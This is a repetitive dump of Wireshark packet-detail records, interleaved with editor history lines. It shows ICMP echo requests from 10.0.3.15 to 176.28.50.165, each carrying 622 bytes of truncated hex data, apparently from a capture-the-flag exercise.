	        Data: 26c6f04446dc252c9d0229994c904a2549261d1c5be02412‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    386 58.844905543   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 387)
	
	Frame 386: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x0370 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 387]
	    Data (622 bytes)
	
c1ef3405eecfec3ba2d4f104c0263a3e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: ad998ef60e84efe3e8106e099ded424f268944826eddcae9‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    388 59.386762017   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 389)
	
	Frame 388: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x04d3 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 389]
	    Data (622 bytes)
	
0e9838541c86140a51106d3ce57d38f7|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 2ea2a4b484b274294d3b7792ed48237d1f4b58a4b4b18d6d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    390 59.925366572   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 391)
	
	Frame 390: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8378 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 391]
	    Data (622 bytes)
	
332c447cd2d7d03dcde1a53a52422e30|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 96d49c9fe192955240f860f99656986b631901b6eea3e338‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    416 60.461214190   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 417)
	
	Frame 416: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x5af5 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 417]
	    Data (622 bytes)
	
d34cd4b85a48076b677c9fae00ea062d|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 6cc48deb8541321a110a2d3a155a87a7908b4a7164c4a09e‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    418 61.005916086   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 419)
	
	Frame 418: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x98da [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 419]
	    Data (622 bytes)
	
9df2953dcede0c4adb7d4d6234c289c4|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 80f0a2a21cc5852af1aa0a77e663d936b69350c8d056968d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    420 61.538071647   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 421)
	
	Frame 420: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa8bb [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 421]
	    Data (622 bytes)
	
8a3302024b371c0b66dd99f5ae077bb7|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 5504d1dc380f85e733ff6a345cb7047ccf034b2331ed9610‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    422 62.064921463   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 423)
	
	Frame 422: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4f78 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 423]
	    Data (622 bytes)
	
9db2dce859cc7c495b1259a2e7f5d9a9|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 9f9c63733fc0271e190a7d6c85bac34f94dad0749fdc73f8‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    424 62.589011886   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 425)
	
	Frame 424: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x55a1 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 425]
	    Data (622 bytes)
	
9bf800191869d49a969c700ab061695a|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: fd638978c679c539fa41b2d7a8fe105096ba42459591ae87‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    426 63.117756630   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 427)
	
	Frame 426: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x1c09 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 427]
	    Data (622 bytes)
	
4aa4977047ca32094b8b3183dc530768|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 525242aa3809f878f8e0a8506abe94d8ea95d0dcd4c4876b‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    428 63.649694244   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 429)
	
	Frame 428: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x63b8 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 429]
	    Data (622 bytes)
	
3c3b55df35bf8d2068ef82896733c75e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 2baee0e28913f9f2355feeb4dfbffce52f294aa5f8def7bf‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    430 64.181464306   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 431)
	
	Frame 430: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2df4 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 431]
	    Data (622 bytes)
	
7693a81e73164674632e4c4b5930776f|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 45fdfdfaf563cc98314c99328509132670d4914729046a89‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    434 65.249494019   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 435)
	
	Frame 434: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x79c7 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 435]
	    Data (622 bytes)
	
f19fc8b8f3d769f02532344414a04e0e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 87f2c31ffe90175e78812953a6d0dede4e2a9562f0e0c1ac‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    432 64.714062703   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 433)
	
	Frame 432: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x37da [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 433]
	    Data (622 bytes)
	
d76f0680d0ac4eee45553d30437ce0bb|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: f3cea357cf9e05cb5d7ed9e5bc32bb1ad77363fac85d4ead‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    436 65.797181969   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 437)
	
	Frame 436: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa5d5 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 437]
	    Data (622 bytes)
	
5763e19a6e2677e66a5417c640dae0dc|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: d41687da41b13760381503ca5a318284c84748b9dcdabe83‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    438 66.331487374   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 439)
	
	Frame 438: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4ae6 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 439]
	    Data (622 bytes)
	
c2e1dd3aa72b6a630141747e33b6ba7b|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: a4cf4735356cdf511b9f23231814d1d90b830174f61ef71b‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    440 66.869900570   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 441)
	
	Frame 440: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x660d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 441]
	    Data (622 bytes)
	
536cb02e465191e3e50cffc777b827eb|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: a5975dc6df1e7d84fabafae0d03284e13e21d7a360d67264‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    442 67.408885042   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 443)
	
	Frame 442: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xe1bd [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 443]
	    Data (622 bytes)
	
22e8692035fd2993d3efd904f3416e72|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 3717bcc557dada282d2de5b39f19c5fa0deb1939722400cf‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    444 67.956039317   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 445)
	
	Frame 444: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x9b9e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 445]
	    Data (622 bytes)
	
f595e4dc55ff3a68bea8e44689f90c1d|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 84425a395147d5f302351fc8d8229391767391a2a1281ded‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    446 68.512456434   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 447)
	
	Frame 446: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xb1a7 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 447]
	    Data (622 bytes)
	
84cb278d71146d954716f59c75275e5b|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 721171dd3eeb4daef5773e22acaaaa6467e3ceb0af129e7d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    448 69.048818008   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 449)
	
	Frame 448: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8271 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 449]
	    Data (622 bytes)
	
6b4c96c7b1157350cdec3d1a85b68cb7|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 86f51bb8e5965b78cd6b5ec36db7dd56ea1805d3b597beec‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    450 69.581460745   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 451)
	
	Frame 450: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa8e0 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 451]
	    Data (622 bytes)
	
44d8f9fba561607c56e9d1b3c2fa963f|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 2e2935518edd72cb2d7cfef35f18b392c2d6ad5b7b567e68‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    452 70.125670642   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 453)
	
	Frame 452: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4cf1 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 453]
	    Data (622 bytes)
	
171605af8d24c34b4cb194bf68c3f0c7|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: cac979a2ee4cc19af57ffbf69dac5fbfbe23c352994e3af9‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    454 70.669241176   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 455)
	
	Frame 454: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x3799 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 455]
	    Data (622 bytes)
	
23b16ff2f71ec7cc833ab2556713a993|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 29460bf008a888aad57987774ef64c0578176c9445fbc6f7‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    456 71.214240064   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 457)
	
	Frame 456: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xb4c8 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 457]
	    Data (622 bytes)
	
f40dff0098b531af3257132a0932edb1|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 6eda9bf6e75069e76fe9d02055d20ac1aff4fc109ee557af‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    458 71.761957757   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 459)
	
	Frame 458: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xed46 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 459]
	    Data (622 bytes)
	
62b673c596ce50339b051648392fd8d1|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 4f1b108e7222c837753ffac40920fa842948305e891d2c53‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    460 72.297294223   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 461)
	
	Frame 460: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2977 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 461]
	    Data (622 bytes)
	
8678518d67a8013d6efca8db14f3c586|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 29cc7b52ebf2aad43ed8d3b45139380a1606afccacc65f26‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    462 72.837853179   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 463)
	
	Frame 462: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4568 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 463]
	    Data (622 bytes)
	
abd220615b44f6ef9fe5024e22fa9c7b|file:///home/neo/ccsc/echoes/bytes.txt|3979|17|v|text
	89e2b011c9c24dad234d53468647688c8ca000671d492a‚Ä¶
7afe66b1e9e52a00f98cbd06273b9e2b|file:///home/neo/ccsc/echoes/bytes.txt|3979|9|v|text
	Data: 5089e2b011c9c24dad234d53468647688c8ca000671d492a‚Ä¶
93c8ef61e4d5ed64a8c338729ef2144f|file:///home/neo/ccsc/echoes/bytes.txt|3979|1|V|text
	        Data: 5089e2b011c9c24dad234d53468647688c8ca000671d492a‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    464 73.381201403   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 465)
	
	Frame 464: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2cd0 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 465]
	    Data (622 bytes)
	
58b1fcf2acc4ce124a845247269596e3|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: d0dab30bdd1cc607efd5439e94866047f5ca604d2d149854‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    466 73.921834228   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 467)
	
	Frame 466: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc51a [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 467]
	    Data (622 bytes)
	
b19263b7b1bbf8f98e01fe6e627c3f27|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 42856cbc7ff997efe46fdefbdebc62fba8930269ad49d294‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    468 74.454582630   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 469)
	
	Frame 468: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xfef8 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 469]
	    Data (622 bytes)
	
74a4656bb78c052823e1f624cb046407|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: c5bffffb7ff089ab3eceab5e7509a79efa2cdef5ae77f281‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    470 74.992764096   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 471)
	
	Frame 470: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xca93 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 471]
	    Data (622 bytes)
	
